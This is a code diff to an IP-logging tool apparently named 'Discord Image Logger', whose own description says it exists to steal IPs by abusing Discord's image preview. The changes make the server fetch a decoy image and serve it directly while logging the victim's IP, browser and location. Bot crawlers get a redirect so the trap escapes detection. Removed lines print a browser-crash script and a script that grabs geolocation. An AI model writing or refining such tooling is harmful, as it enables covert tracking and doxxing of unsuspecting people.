@@ -1,9 +1,10 @@
-# Discord Image Logger - Shows Real Image
+# Discord Image Logger - Server-Side Image Serving
 # By Dexty | https://github.com/xdexty0
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
+import io
 
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
@@ -30,7 +31,7 @@ config = {
     },
     "vpnCheck": 1,
     "linkAlerts": True,
-    "buggedImage": False,  # CHANGED: Set to False to show real image
+    "buggedImage": False,
     "antiBot": 1,
 
     # REDIRECTION #
@@ -176,111 +177,77 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
                 s = self.path
                 dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                 if dic.get("url") or dic.get("id"):
-                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
+                    image_url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                 else:
-                    url = config["image"]
+                    image_url = config["image"]
             else:
-                url = config["image"]
-
-            # HTML that shows the ACTUAL image
-            data = f'''<style>
-body {{
-    margin: 0;
-    padding: 0;
-    background-color: #000;
-}}
-.img-container {{
-    background-image: url('{url}');
-    background-position: center center;
-    background-repeat: no-repeat;
-    background-size: contain;
-    width: 100vw;
-    height: 100vh;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-}}
-</style>
-<div class="img-container"></div>'''.encode()
+                image_url = config["image"]
             
             if client_ip.startswith(blacklistedIPs):
                 return
             
             if bot:
-                # For bots (Discord crawler), redirect to the actual image URL
+                # For bots, redirect to actual image
                 self.send_response(302)
-                self.send_header('Location', url)
+                self.send_header('Location', image_url)
                 self.end_headers()
-                makeReport(client_ip, endpoint = s.split("?")[0], url = url, is_bot=True)
+                makeReport(client_ip, endpoint = s.split("?")[0], url = image_url, is_bot=True)
                 return
             
             else:
-                # For real users, show the actual image and log their IP
-                s = self.path
-                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
+                # SERVER-SIDE IMAGE SERVING
+                # Download the image and serve it directly
+                try:
+                    # Fetch the image from the URL
+                    response = requests.get(image_url, stream=True)
+                    response.raise_for_status()
+                    
+                    # Get image content and content type
+                    image_data = response.content
+                    content_type = response.headers.get('content-type', 'image/jpeg')
+                    
+                    # Log the user's IP and info
+                    s = self.path
+                    dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
 
-                if dic.get("g") and config["accurateLocation"]:
-                    location = base64.b64decode(dic.get("g").encode()).decode()
-                    result = makeReport(client_ip, user_agent, location, s.split("?")[0], url = url)
-                else:
-                    result = makeReport(client_ip, user_agent, endpoint = s.split("?")[0], url = url)
-
-                message = config["message"]["message"]
-
-                if config["message"]["richMessage"] and result:
-                    message = message.replace("{ip}", client_ip)
-                    message = message.replace("{isp}", result["isp"])
-                    message = message.replace("{asn}", result["as"])
-                    message = message.replace("{country}", result["country"])
-                    message = message.replace("{region}", result["regionName"])
-                    message = message.replace("{city}", result["city"])
-                    message = message.replace("{lat}", str(result["lat"]))
-                    message = message.replace("{long}", str(result["lon"]))
-                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
-                    message = message.replace("{mobile}", str(result["mobile"]))
-                    message = message.replace("{vpn}", str(result["proxy"]))
-                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
-                    message = message.replace("{browser}", httpagentparser.simple_detect(user_agent)[1])
-                    message = message.replace("{os}", httpagentparser.simple_detect(user_agent)[0])
-
-                datatype = 'text/html'
-
-                if config["message"]["doMessage"]:
-                    data = message.encode()
-                
-                if config["crashBrowser"]:
-                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'
-
-                if config["redirect"]["redirect"]:
-                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
-                
-                self.send_response(200)
-                self.send_header('Content-type', datatype)
-                self.end_headers()
-
-                if config["accurateLocation"]:
-                    data += b"""<script>
-var currenturl = window.location.href;
-
-if (!currenturl.includes("g=")) {
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(function (coords) {
-    if (currenturl.includes("?")) {
-        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
-    } else {
-        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
-    }
-    location.replace(currenturl);});
+                    if dic.get("g") and config["accurateLocation"]:
+                        location = base64.b64decode(dic.get("g").encode()).decode()
+                        result = makeReport(client_ip, user_agent, location, s.split("?")[0], url = image_url)
+                    else:
+                        result = makeReport(client_ip, user_agent, endpoint = s.split("?")[0], url = image_url)
+                    
+                    # Serve the actual image directly
+                    self.send_response(200)
+                    self.send_header('Content-type', content_type)
+                    self.send_header('Content-Length', str(len(image_data)))
+                    self.end_headers()
+                    self.wfile.write(image_data)
+                    
+                except Exception as e:
+                    # If image download fails, fall back to HTML method
+                    html_fallback = f'''<style>body {{
+margin: 0;
+padding: 0;
 }}
-
-</script>"""
-                self.wfile.write(data)
+div.img {{
+background-image: url('{image_url}');
+background-position: center center;
+background-repeat: no-repeat;
+background-size: contain;
+width: 100vw;
+height: 100vh;
+}}</style><div class="img"></div>'''
+                    
+                    self.send_response(200)
+                    self.send_header('Content-type', 'text/html')
+                    self.end_headers()
+                    self.wfile.write(html_fallback.encode())
         
         except Exception:
             self.send_response(500)
             self.send_header('Content-type', 'text/html')
             self.end_headers()
-            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
+            self.wfile.write(b'500 - Internal Server Error')
             reportError(traceback.format_exc())
 
         return
